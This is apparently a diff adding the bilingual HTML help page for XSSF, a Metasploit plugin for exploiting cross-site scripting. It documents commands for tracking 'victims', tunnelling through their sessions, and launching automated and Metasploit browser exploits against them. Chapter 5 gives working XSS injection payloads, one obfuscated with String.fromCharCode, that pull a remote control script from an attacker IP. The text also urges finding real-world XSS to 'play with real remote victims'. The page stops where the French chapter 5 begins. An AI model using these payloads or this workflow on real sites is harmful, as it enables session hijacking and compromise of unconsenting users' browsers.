@@ -1,0 +1,879 @@
+<html>
+	<head>
+		<title>XSSF Help</title>
+		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+		<style>
+			ul#menu 				{ width: 250px; list-style-type: none; border-top: solid 1px #FFFFFF; margin: 0; padding: 0; }	  
+			ul#menu ol 				{ display: none; text-align: left; list-style-type: none; margin-left: 15px; padding: 5px; }
+			ul#menu li, ul#menu a 	{ font-family: monospace; color: green; }
+			ul#menu li 				{ border-bottom: solid 1px #FFFFFF; line-height: 15px; }
+			ul#menu ol li 			{ border-bottom: none; }
+			ul#menu a 				{ text-decoration: none; outline: none;	}
+			ul#menu a:hover 		{ color: cyan; }
+			ul#menu a.active 		{ color: cyan; font-style: bold; }
+		</style>
+		
+		<script type="text/javascript">
+			var lang = "uk";
+			
+			var menus = new Array();
+			menus['uk'] = [	"&#183; Install XSSF", "&#183; Start XSSF", "&#183; XSSF commands", "&#183; XSSF test page", 
+							"&#183; XSS exploitation", "&#183; Victims", "&#183; Launch XSSF attack", "&#183; Launch MSF attack",
+							"&#183; Automated attacks", "&#183; XSSF Tunnel", "&#183; XSSF GUI", "&#183; Remote XSSF use",
+							"&#183; XSSF architecture", "&#183; Code an XSSF module", "&#183; Return a result to XSSF", "&#183; XSSF JavaScript functions"];
+							
+			menus['fr'] = [	"&#183; Installer XSSF", "&#183; Lancer XSSF", "&#183; Commandes XSSF", "&#183; Page de test XSSF", "&#183; Exploitation de XSS",
+							"&#183; Victimes", "&#183; Lancement d'attaques XSSF", "&#183; Lancement d'attaques MSF", "&#183; Attaques automatiques",
+							"&#183; XSSF Tunnel", "&#183; XSSF GUI", "&#183; Utilisation à distance", "&#183; Architecture XSSF", "&#183; Coder un module XSSF",
+							"&#183; Retour de résultats à XSSF", "&#183; Fonctions javascript XSSF"];
+			
+			
+			function change_lang(l) {
+				var i = 0;
+				
+				for (i = 0; i <= 16 ; i++)
+					if (document.getElementById('D' + i + lang).style.display == 'block')
+						break;
+
+				lang = l;
+				
+				for (var j = 1; j <= 16 ; j++)
+					document.getElementById(j).innerHTML = menus[lang][j-1];
+
+				if (lang == 'uk') {
+					document.getElementById("title0").innerHTML = "Users Guide";
+					document.getElementById("title1").innerHTML = "Developers Guide ";
+				}
+				else {
+					document.getElementById("title0").innerHTML = "Guide utilisateurs";
+					document.getElementById("title1").innerHTML = "Guide développeurs";
+				}
+				
+				display(i);
+			}
+		</script>
+		
+		<script type="text/javascript">
+			/*
+			Created by: Travis Beckham :: http://www.squidfingers.com | http://www.podlob.com
+			version date: 06/02/03 :: If want to use this code, feel free to do so,
+			but please leave this message intact. (Travis Beckham) 
+			*/
+			// Node Functions
+
+			if(!window.Node){
+			  var Node = {ELEMENT_NODE : 1, TEXT_NODE : 3};
+			}
+
+			function checkNode(node, filter){
+			  return (filter == null || node.nodeType == Node[filter] || node.nodeName.toUpperCase() == filter.toUpperCase());
+			}
+
+			function getChildren(node, filter){
+			  var result = new Array();
+			  var children = node.childNodes;
+			  for(var i = 0; i < children.length; i++){
+				if(checkNode(children[i], filter)) result[result.length] = children[i];
+			  }
+			  return result;
+			}
+
+			function getChildrenByElement(node){
+			  return getChildren(node, "ELEMENT_NODE");
+			}
+
+			function getFirstChild(node, filter){
+			  var child;
+			  var children = node.childNodes;
+			  for(var i = 0; i < children.length; i++){
+				child = children[i];
+				if(checkNode(child, filter)) return child;
+			  }
+			  return null;
+			}
+
+			function getFirstChildByText(node){
+			  return getFirstChild(node, "TEXT_NODE");
+			}
+
+			function getNextSibling(node, filter){
+			  for(var sibling = node.nextSibling; sibling != null; sibling = sibling.nextSibling){
+				if(checkNode(sibling, filter)) return sibling;
+			  }
+			  return null;
+			}
+			function getNextSiblingByElement(node){
+					return getNextSibling(node, "ELEMENT_NODE");
+			}
+
+			// Menu Functions & Properties
+
+			var activeMenu = null;
+
+			function showMenu() {
+			  if(activeMenu){
+				activeMenu.className = "";
+				getNextSiblingByElement(activeMenu).style.display = "none";
+			  }
+			  if(this == activeMenu){
+				activeMenu = null;
+			  } else {
+				this.className = "active";
+				getNextSiblingByElement(this).style.display = "block";
+				activeMenu = this;
+			  }
+			  return false;
+			}
+
+			function initMenu(){
+			  var menus, menu, text, a, i;
+			  menus = getChildrenByElement(document.getElementById("menu"));
+			  for(i = 0; i < menus.length; i++){
+				menu = menus[i];
+				text = getFirstChildByText(menu);
+				a = document.createElement("a");
+				menu.replaceChild(a, text);
+				a.appendChild(text);
+				a.href = "#";
+				a.onclick = showMenu;
+				a.id = "title" + i;
+				a.onfocus = function(){this.blur()};
+			  }
+			}
+			
+			function display(id) {
+				try {
+					for (var i = 0; i <= 16 ; i++) 
+						document.getElementById('D' + i + "uk").style.display = 'none';
+
+					for (var i = 0; i <= 16 ; i++) 
+						document.getElementById('D' + i + "fr").style.display = 'none';
+				} catch(e) {}
+					
+				
+				document.getElementById('D' + id + lang).style.display = 'block';
+			}
+
+			if(document.createElement) window.onload = initMenu;
+		</script>
+
+	</head>
+	<body bgcolor=black style='font-family:monospace'>
+		<table width="100%" height="100%" cellpadding="0" cellspacing="0">
+			<tr valign="top">
+				<td width="250px">
+					<ul id="menu" style="position: absolute; top: 0px; left: 0px;">
+						<li>Users Guide
+							<ol>
+								<li><a style="cursor:pointer;" id="1" onclick="display(1);">&#183; Install XSSF</a></li>
+								<li><a style="cursor:pointer;" id="2" onclick="display(2);">&#183; Start XSSF</a></li>
+								<li><a style="cursor:pointer;" id="3" onclick="display(3);">&#183; XSSF commands</a></li>
+								<li><a style="cursor:pointer;" id="4" onclick="display(4);">&#183; XSSF test page</a></li>
+								<li><a style="cursor:pointer;" id="5" onclick="display(5);">&#183; XSS exploitation</a></li>
+								<li><a style="cursor:pointer;" id="6" onclick="display(6);">&#183; Victims</a></li>
+								<li><a style="cursor:pointer;" id="7" onclick="display(7);">&#183; Launch XSSF attack</a></li>
+								<li><a style="cursor:pointer;" id="8" onclick="display(8);">&#183; Launch MSF attack</a></li>
+								<li><a style="cursor:pointer;" id="9" onclick="display(9);">&#183; Automated attacks</a></li>
+								<li><a style="cursor:pointer;" id="10" onclick="display(10);">&#183; XSSF Tunnel</a></li>
+								<li><a style="cursor:pointer;" id="11" onclick="display(11);">&#183; XSSF GUI</a></li>
+								<li><a style="cursor:pointer;" id="12" onclick="display(12);">&#183; Remote XSSF use</a></li>
+							</ol>
+						</li>
+						<li>Developers Guide
+							<ol>
+								<li><a style="cursor:pointer;" id="13" onclick="display(13);">&#183; XSSF architecture</a></li>
+								<li><a style="cursor:pointer;" id="14" onclick="display(14);">&#183; Code an XSSF module</a></li>
+								<li><a style="cursor:pointer;" id="15" onclick="display(15);">&#183; Return a result to XSSF</a></li>
+								<li><a style="cursor:pointer;" id="16" onclick="display(16);">&#183; XSSF JavaScript functions</a></li>
+							</ol>
+						</li>
+						<table width=100%><tr align=center>
+						<td><img src="./uk.png" width=20% style="cursor:pointer" onclick="change_lang('uk');"/></td>
+						<td><img src="./fr.png" width=20% style="cursor:pointer" onclick="change_lang('fr');"/></td>
+					</tr></table>
+					</ul>
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+				</td>
+				
+				<td>
+
+				
+				
+				
+				<!-- ############ -->				
+				<!-- INTRODUCTION -->
+				<!-- ############ -->
+					<div id="D0uk" style='color:white; text-align:justify; display:block'>
+						<h2 style='color:cyan;'><center>Introduction</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;The Cross-Site Scripting Framework (XSSF) is a security tool designed to turn the XSS vulnerability exploitation task into a much easier work. The XSSF project aims to demonstrate the real dangers of XSS vulnerabilities, vulgarizing their exploitation. This project is created solely for education, penetration testing and lawful research purposes.<br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF allows creating a communication channel with the targeted browser (from a XSS vulnerability) in order to perform further attacks. Users are free to select existing modules (a module = an attack) in order to target specific browsers.<br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF provides a powerfull documented API, which facilitates development of modules and attacks. In addition, its integration into the Metasploit Framework allows users to launch MSF browser based exploit easilly from an XSS vulnerability. <br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;In addition, an interesting though exploiting an XSS inside a victim's browser could be to browse website on attacker's browser, using the connected victim's session. In most of cases, simply stealing the victim cookie will be sufficient to realize this action. But in minority of cases (intranets, network tools portals ...), cookie won't be useful for an external attacker. That's why XSSF Tunnel was created to help the attacker browsing on affected domain using the victim's session.<br /><br />
+						
+						XSSF has being tested on following browsers (with default installs):
+						<ul>
+							<li> Mozilla Firefox &ge; 2 </li>
+							<li> Google Chrome &ge; 5 </li>
+							<li> Microsoft Internet Explorer &ge; 6 </li>
+							<li> Apple Safari &ge; 3 </li>
+							<li> Opera &ge; 9 </li>
+							<li> Android Browser (&ge; 2.1) </li>
+						</ul><br/>
+						
+						<b style="color:red">NOTE:</b> Feel free to send your comments or give your opinion to improve the XSS Framework at ludovic.courgnaud /at\ gmail.com.<br/>
+						XSSF new modules can be sent to the same address. Don't forget to fill your name in the module initialization author field and / or the original discoverer name.<br/><br/>
+						
+						<b style="color:red">IMPORTANT:</b> XSSF goal is to exploit XSS vulnerabilities. The project doesn't include XSS vulnerability finder and won't include one in the future! In addition - as a project in development - XSSF still doesn't support some cases, especially regarding the use of the XSSF tunnel with an XSS over HTTPS domain (IE). Finally, XSSF is designed to be fully compatible with the last MSF version. It is possible that XSSF returns errors with non-updated versions.<br/><br/>
+						
+						<b style="color:red">ABOUT:</b> XSSF v2.0 - Ludovic Courgnaud - <a href="javascript:top.location='http://blog.conixsecurity.fr/'">CONIX Security</a>
+						<br/><br/><br/><center><img src="./xssf.png"/></center>
+					</div>
+					
+					<div id="D0fr" style='color:white; text-align:justify; display:none'>
+						<h2 style='color:cyan;'><center>Introduction</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Le Framework de Cross-Site Scripting (XSSF) est un outil de sécurité visant à simplifier la tâche d'exploitation des vulnérabilités XSS. Le but du projet XSSF est de démontrer les réels dangers des vulnérabilités XSS en vulgarisant leur exploitation. Ce projet est créé uniquement à des fins d'éducation, de recherche et de démonstration de vulnérabilités.<br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF permet de créer un canal de communication avec le navigateur visé (par la vulnérabilité XSS) dans le but de réaliser des attaques dans le temps. Libre aux utilisateurs de choisir parmi les modules existants (un module = une attaque) afin de cibler des navigateurs spécifiques.<br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF fournit une API puissante et documentée, qui permet de faciliter le développement de modules et d'attaques. De plus, son intégration dans le Framework Metasploit permet aux utilisateurs de lancer directement des exploits navigateurs MSF facilement depuis une vulnérabilité XSS.<br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;Enfin, une des possibilités intéressantes lors de l'exploitation des XSS à l'intérieur du navigateur d'une victime pourrait être de surfer directement sur le site vulnérable depuis le navigateur de l'attaquant, en utilisant les informations de session de la victime connectée.  Dans la plupart des cas, le vol simple du cookie de la victime suffira à réaliser cette action. Dans certains cas particuliers (intranets, portails d'administration d'outils réseaux, etc.), le cookie sera inutile pour un attaquant extérieur. C'est pourquoi XSSF Tunnel à été créé afin d'aider l'attaquant à naviguer sur le domaine vulnérable en utilisant la session de la victime déjà connectée.<br /><br />
+						
+						Le projet XSSF à été testé sur les navigateurs suivants (avec les installations par défaut) :
+						<ul>
+							<li> Mozilla Firefox &ge; 2 </li>
+							<li> Google Chrome &ge; 5 </li>
+							<li> Microsoft Internet Explorer &ge; 6 </li>
+							<li> Apple Safari &ge; 3 </li>
+							<li> Opera &ge; 9 </li>
+							<li> Android Browser (&ge; 2.1) </li>
+						</ul><br/>
+						
+						<b style="color:red">NOTE :</b> N'hésitez pas à envoyer vos commentaires où à donner votre opinion afin d'améliorer le Framework XSS à ludovic.courgnaud /at\ gmail.com.<br/>
+						De nouveaux modules XSSF peuvent être envoyés à cette même adresse. N'oubliez pas de renseigner votre nom dans l'initialisation du module créé.<br/><br/>
+						
+						<b style="color:red">IMPORTANT :</b> Le but d'XSSF est l'exploitation des vulnérabilités XSS. Le projet n'inclut pas d'outil de recherche de vulnérabilités XSS et n'en inclura pas dans le futur! De plus - en tant que projet encore en développement - il est possible que certains scénarios ne soient pas encore supportés, notamment lors de l'utilisation du tunnel XSSF à partir d'une XSS sur un domaine en HTTPS (IE). Enfin, XSSF est conçu pour être entièrement compatible avec les dernières versions de MSF uniquement. Il est possible qu'il ne fonctionne plus avec des versions assez anciennes.<br/><br/>
+						
+						<b style="color:red">A PROPOS :</b> XSSF v2.0 - Ludovic Courgnaud - <a href="javascript:top.location='http://blog.conixsecurity.fr/'">CONIX Security</a>
+						<br/><br/><br/><center><img src="./xssf.png"/></center>
+					</div>
+					
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 1   -->
+					<!-- ############ -->
+					<div id="D1uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Install XSSF</center></h2>
+						<b style="color:red">PREREQUISITES:</b> XSSF is not integrated officially yet inside Metasploit Framework. Before installing XSSF, please make sure MSF is installed on your distribution (<a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Installation'">MSF Installation</a>). XSSF uses connection to database to interact with XSS victims. All MSF supported databases are also supported by XSSF (<a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Sqlite_setup'">SQLite</a>, <a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Mysql_setup'">Mysql</a>, <a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Postgres_setup'">PostgreSQL</a> [recommended]). Please make sure one of these is installed before installing and running XSSF.<br/><br/>
+						
+						XSSF installation is very easy. All you need to do is copy the XSSF folder contents into your MSF install directory:						<ul>
+							<li> Windows command: <span style='color:green;'>XCOPY "XSSF\*" "C:\"PATH_TO_MSF_FOLDER\msf3\" /F /E /C /I /Y </span></li>
+							<li> Linux command: <span style='color:green;'>CP -R "./XSSF/*" "/PATH_TO_MSF_FOLDER/msf3/" </span></li>
+						</ul><br/>
+						
+						Once it's done, you can start playing with XSSF!
+					</div>
+					
+					<div id="D1fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Installer XSSF</center></h2>
+						<b style="color:red">PREREQUIS :</b> Le projet XSSF n'est pas encore intégré officiellement à l'intérieur du Framework Metasploit. Avant d'installer XSSF, assurez-vous de bien avoir installé MSF (<a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Installation'">Installation MSF</a>). XSSF utilise une connexion avec une base de données afin d'interagir avec les victimes XSS. Toutes les bases de données supportées par MSF le sont aussi par XSSF (<a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Sqlite_setup'">SQLite</a>, <a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Mysql_setup'">Mysql</a>, <a href="javascript:top.location='http://dev.metasploit.com/redmine/projects/framework/wiki/Postgres_setup'">PostgreSQL</a> [recommandée]). Assurez-vous que l'une des trois est installée avant de continuer à utiliser XSSF.<br/><br/>
+						
+						L'installation de XSSF est très simple, la seule chose à faire est de copier le contenu du répertoire XSSF dans le répertoire d'installation de MSF :						<ul>
+							<li> Commande Windows : <span style='color:green;'>XCOPY "XSSF\*" "C:\"CHEMIN_DU_REPERTOIRE_MSF\msf3\" /F /E /C /I /Y </span></li>
+							<li> Commande Linux : <span style='color:green;'>CP -R "./XSSF/*" "/CHEMIN_DU_REPERTOIRE_MSF/msf3/" </span></li>
+						</ul><br/>
+						
+						Une fois la copie réalisée, vous pouvez commencer à vous amuser avec XSSF!
+					</div>
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 2   -->
+					<!-- ############ -->
+					<div id="D2uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Start XSSF</center></h2>
+						<OL>
+							<LI>Start Metasploit Framework (MSF Console for example).</LI>
+							<LI>Connect to a database if that's not automatically done.</LI>
+							<LI>Load XSSF plugin using the command '<span style='color:green;'>load xssf'.</LI>
+							<UL>
+								<LI>XSSF server port can be modified using the command '<span style='color:green;'>load xssf Port=80</span>'.</LI>
+								<LI>XSSF server URI can be changed using the command '<span style='color:green;'>load xssf Uri=/</span>'.</LI>
+								<LI>Remote access to XSSF GUI and Tunnel can be activated using the command '<span style='color:green;'>load xssf Public=true</span>'.</LI>
+								<LI>XSSF mode for information messages can be changed using the command '<span style='color:green;'>load xssf Mode=???</span>'. Information messages are displayed during attacks or during tunnel transferts. Accepted modes are:</LI>
+								<UL>
+									<LI><span style='color:green;'>Quiet</span>: Does not display anything.</LI>
+									<LI><span style='color:green;'>Normal</span>: Displays attacks and tunnel status messages only (default mode).</LI>
+									<LI><span style='color:green;'>Verbose</span>: Displays all 'Normal' mode messages plus received results from victims.</LI>
+									<LI><span style='color:green;'>Debug</span>: Displays all 'Verbose' mode messages plus XSSF exceptions error messages if exceptions are trigered (should not :-) ). </LI>
+								</UL>
+							</UL>
+						</OL>
+						<b style="color:red">EXAMPLE:</b> To launch XSSF on port 80, on /xssf/ uri, with attacker's interfaces (GUI, Tunnel) available from remote and with all messages displayed from attacks, just launch XSSF with the command '<span style='color:green;'>load xssf Port=80 Uri=/xssf/ Public=true Mode=Verbose</span>'.<br/>
+						
+						<br/><br/><center><img src="./start.png"/></center><br/><br/>
+						<b style="color:red">NOTE:</b> Launching XSSF victims' server on port 'x' will launch attacker' server on port 'x + 1'. Attacker' server is useful to access web GUI (logs, stats, etc.) and to access XSSF Tunnel. <br/>
+						<b style="color:red">IMPORTANT:</b> Remember that you'll have to run Metasploit Framework in administrator mode to run XSSF on ports below 1024. In addition, if XSSF returns databases errors at this point, please make sure last Ruby, Rubygem and database driver versions are installed on your system.
+					</div>
+					
+					<div id="D2fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Lancer XSSF</center></h2>
+						<OL>
+							<LI>Lancer le Framework Metasploit (MSF Console par exemple).</LI>
+							<LI>Connecter MSF à une base de données si cela n'est pas fait automatiquement.</LI>
+							<LI>Charger XSSF en utilisant la commande '<span style='color:green;'>load xssf'.</LI>
+							<UL>
+								<LI>Le port du serveur XSSF peut être modifié en utilisant la commande '<span style='color:green;'>load xssf Port=80</span>'.</LI>
+								<LI>L'URI du serveur XSSF peut être modifiée en utilisant la commande '<span style='color:green;'>load xssf Uri=/</span>'.</LI>
+								<LI>L'accès distant à la GUI XSSF et au Tunnel XSSF peut être activé en utilisant la commande '<span style='color:green;'>load xssf Public=true</span>'.</LI>
+								<LI>Le mode d'XSSF concernant l'affichage des messages peut être changé en utilisant la commande '<span style='color:green;'>load xssf Mode=???</span>'. Les messages d'information sont affichés pendant les attaques ou les transferts dans le tunnel. Les paramètres acceptés sont :</LI>
+								<UL>
+									<LI><span style='color:green;'>Quiet</span> : N'affiche aucun message.</LI>
+									<LI><span style='color:green;'>Normal</span> : Affiche le status des attaques et du tunnel seulement (mode par défaut).</LI>
+									<LI><span style='color:green;'>Verbose</span> : Affiche tout les messages du mode 'Normal' plus les résultats reçus des victimes directement dans la console.</LI>
+									<LI><span style='color:green;'>Debug</span> : Affiche tout les messages du mode 'Verbose' plus les messages d'erreurs à l'intérieur des exceptions XSSF si elles sont déclanchées (ne devraient pas :-) ). </LI>
+								</UL>
+							</UL>
+						</OL>
+						<b style="color:red">EXEMPLE:</b> Pour lancer XSSF sur le port 80, l'URI /xssf/, avec l'interface attaquant (GUI, tunnel) accessible à distance et avec tous les messages affichés dans la console, lancer XSSF avec la commande '<span style='color:green;'>load xssf Port=80 Uri=/xssf/ Public=true Mode=Verbose</span>'.<br/>
+						
+						<br/><br/><center><img src="./start.png"/></center><br/><br/>
+						<b style="color:red">NOTE:</b> Le lancement du serveur XSSF pour les victimes sur le port 'x' entrainera le lancement du serveur pour l''attaquant sur le port 'x + 1'. Le serveur attaquant est utile pour accéder aux pages de la GUI (logs, stats, etc.) ainsi qu'au Tunnel XSSF). <br/>
+						<b style="color:red">IMPORTANT:</b> Afin de lancer le serveur XSSF sur des ports inférieurs à 1024, il est nécessaire de lancer le Framework Metasploit en tant qu'administrateur. De plus, si XSSF retourne des erreurs de base de données lors du chargement, assurez vous d'avoir des versions à jour de Ruby, Rubygems et des drivers correspondants pour la base de données installés sur votre système.
+					</div>
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 3   -->
+					<!-- ############ -->
+					<div id="D3uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF commands</center></h2>
+						XSSF commands are available through the MSF <span style='color:green;'>help</span> command:
+						<ul>
+							<li> <span style='color:green;'>xssf_victims</span>: Displays all victims</li>
+							<li> <span style='color:green;'>xssf_active_victims</span>: Displays active victims</li>
+							<li> <span style='color:green;'>xssf_information [VictimID]</span>: Displays information about a given victim</li>
+							<li> <span style='color:green;'>xssf_servers</span>: Displays all used attack servers</li>
+							<li> <span style='color:green;'>xssf_logs [VictimID]</span>: Displays logs about a given victim</li>
+							<li> <span style='color:green;'>xssf_log [LogID]</span>: Displays log with given ID</li><br/>
+					
+							<li> <span style='color:green;'>xssf_tunnel [VictimID]</span>: Opens an XSS tunnel with given victim</li>
+							<li> <span style='color:green;'>xssf_exploit [JobID] [VictimIDs]</span>: Launchs a MSF browser based exploit over given victim(s)</li><br/>
+
+							<li> <span style='color:green;'>xssf_add_auto_attack [JobID]</span>: Add a new automated attack (launched automatically at victim's connection)</li>
+							<li> <span style='color:green;'>xssf_remove_auto_attack [JobID]</span>: Remove an automated attack</li>
+							<li> <span style='color:green;'>xssf_auto_attacks</span>: Displays XSSF automated attacks</li><br/>
+							
+							<li> <span style='color:green;'>xssf_remove_victims [VictimIDs]</span>: Remove victims in database</li>
+							<li> <span style='color:green;'>xssf_clean_victims [VictimIDs]</span>: Clean victims in database (delete waiting attacks)</li><br/>
+							
+							<li> <span style='color:green;'>xssf_urls</span>: List useful available URLs provided by XSSF</li>
+							<li> <span style='color:green;'>xssf_banner</span>: Prints XSS Framework banner !</li><br/>
+						</ul><br/>
+						
+						Information about accepted parameters:
+						<ul>
+							<li> <span style='color:green;'>[VictimID]</span>: Only one victim ID (example: 8)</li>
+							<li> <span style='color:green;'>[JobID]</span>: Only one job ID (example: 0). MSF jobs are available through the command <span style='color:green;'>jobs</span>.</li>
+							<li> <span style='color:green;'>[VictimIDs]</span>: One or many victims ID. This parameter can also accept victim ranges (example: 8, 9, 10-19, 45). This parameter is optionnal, and default value will be set to all victims in database. In case of an attack process, only active victims can be targeted.</li>
+							<li> <span style='color:green;'>[LogID]</span>: Only one log ID (example: 76)</li>
+						</ul><br/>
+					</div>
+					
+					<div id="D3fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Commandes XSSF</center></h2>
+						La liste des commandes XSSF est disponible grâce à la commande MSF <span style='color:green;'>help</span> :
+						<ul>
+							<li> <span style='color:green;'>xssf_victims</span> : Affiche toute les victimes</li>
+							<li> <span style='color:green;'>xssf_active_victims</span> : Affiche les victimes actives</li>
+							<li> <span style='color:green;'>xssf_information [VictimID]</span> : Affiche les informations relatives à une victime donnée</li>
+							<li> <span style='color:green;'>xssf_servers</span> : Affiche la liste des serveurs déjà utilisés</li>
+							<li> <span style='color:green;'>xssf_logs [VictimID]</span>: Affiche la liste des logs d'une victime donnée</li>
+							<li> <span style='color:green;'>xssf_log [LogID]</span>: Affiche le log avec l'identifiant donné</li><br/>
+							
+							<li> <span style='color:green;'>xssf_tunnel [VictimID]</span> : Ouvre un tunnel XSS avec une victime donnée</li>
+							<li> <span style='color:green;'>xssf_exploit [JobID] [VictimIDs]</span> : Lance un exploit navigateur MSF sur des victimes données</li><br/>
+
+							<li> <span style='color:green;'>xssf_add_auto_attack [JobID]</span> : Ajoute une attaque automatique (lancée automatiquement lors de la venue d'une nouvelle victime)</li>
+							<li> <span style='color:green;'>xssf_remove_auto_attack [JobID]</span> : Supprime une attaque automatique</li>
+							<li> <span style='color:green;'>xssf_auto_attacks</span> : Affiche la liste des attaques automatiques</li><br/>
+							
+							<li> <span style='color:green;'>xssf_remove_victims [VictimIDs]</span> : Suppression de victime(s) dans la base de données</li>
+							<li> <span style='color:green;'>xssf_clean_victims [VictimIDs]</span> : Nettoyage de victime(s) dans la base de données (supression de la file d'attaques)</li><br/>
+							
+							<li> <span style='color:green;'>xssf_urls</span>: Listes d'URL utiles fournies par le serveur XSSF</li>
+							<li> <span style='color:green;'>xssf_banner</span> : Affichage de la bannière XSSF !</li><br/>
+						</ul><br/>
+						
+						Informations sur les paramètres acceptés :
+						<ul>
+							<li> <span style='color:green;'>[VictimID]</span>: Seulement un identifiant de victime (exemple : 8)</li>
+							<li> <span style='color:green;'>[JobID]</span>: Seulement un identifiant de tâche de fond (exemple : 0). Les tâches de fond MSF sont disponibles grâce à la commande <span style='color:green;'>jobs</span>.</li>
+							<li> <span style='color:green;'>[VictimIDs]</span>: Un ou plusieurs identifiants de victimes. Ce paramètre accepte aussi des intervalles de victimes (exemple : 8, 9, 10-19, 45). Ce paramètre est optionnel, la valeur par défaut prendra toutes les victimes dans la base de données. Dans le cas d'un processus d'attaque, seules les victimes actives peuvent êtres visées.</li>
+							<li> <span style='color:green;'>[LogID]</span>: Seulement un identifiant de log (exemple: 76)</li>
+						</ul><br/>
+					</div>
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 4   -->
+					<!-- ############ -->
+					<div id="D4uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF test page</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;An XSSF testing page with generic XSS injection is available through the command <span style='color:green;'>xssf_test</span>. This page can also be accessed following '<span style='color:green;'>http://XSSF_SERVER:PORT/test.html</span>'. <br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Access to this testing webpage within a browser will create a new victim and a new session with XSSF server.<br/><br/>
+						<center><img src="./test.png"/></center>
+					</div>
+
+					<div id="D4fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Page de test XSSF</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Une page de test XSSF avec l'injection générique de XSS est disponible grâce à la commande <span style='color:green;'>xssf_test</span>. Cette page est disponible à l'adresse suivante : '<span style='color:green;'>http://XSSF_SERVER:PORT/test.html</span>'. <br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;L'accès à cette page de test à l'intérieur d'un navigateur va permettre la création d'une nouvelle victime et d'une nouvelle session avec le serveur XSSF.<br/><br/>
+						<center><img src="./test.png"/></center>
+					</div>
+					
+					
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 5   -->
+					<!-- ############ -->
+					<div id="D5uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSS exploitation</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Now, you need a real world XSS to start playing with real remote victims. Finding XSS is quite simple as few websites implements protections, and because websites don't stop growing fast.<br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF works both with persistant or non-persistant XSS, wether the request is a GET or a POST. The only thing to keep in mind is that some XSS exploitation remains impossible in some cases, like on browser implementing XSS filters (for GET requests), or browser with JavaScript disabled. XSSF won't be able to manage these cases.<br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Let's assume you just found a non-persistant GET XSS on '<span style='color:green;'>http://www.vulnerable.com/index.php?param=value</span>' inside the '<span style='color:green;'>param</span>' parameter. The only thing you have to do in order to link your future victims with XSSF is injecting the generic '<span style='color:green;'>loop</span>' resource provided by XSSF server, whatever the way you do it: 
+						<ul>
+							<li> <span style='color:green;'>http://www.vulnerable.com/index.php?param="'&gt;&lt;script src="http://10.100.36.245/loop"&gt;&lt;/script&gt;</span></li>
+							<li> <span style='color:green;'>http://www.vulnerable.com/index.php?param="'&gt;&lt;img src="none" onerror="s = document.createElement('script');	s.src = "http://10.100.36.245/loop";	document.body.appendChild(s);" /&gt;</span></li>
+							<li> <span style='color:green;'>http://www.vulnerable.com/index.php?param="'&gt;&lt;script&gt; eval(String.fromCharCode(115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 9, 115, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 48, 46, 51, 54, 46, 50, 52, 53, 47, 108, 111, 111, 112, 34, 59, 9, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 41, 59)); &lt;/script&gt;/span></li>
+							<li> <span style='color:green;'>...</span></li>
+						</ul><br/><br />
+						<b style="color:red">IMPORTANT:</b> Once injected, the XSSF script makes a loop to ask victim's commands. The default loop interval is set to 5 seconds, and can be changed, calling the '<span style='color:green;'>loop</span>' ressource with '<span style='color:green;'>interval</span>' parameter (example '<span style='color:green;'>/loop?interval=1</span>').<br/><br/>
+						<center><img src="./loop.png"/></center>
+					</div>
+					
+					<div id="D5fr" style='color:white; display:none; text-align:justify;'>
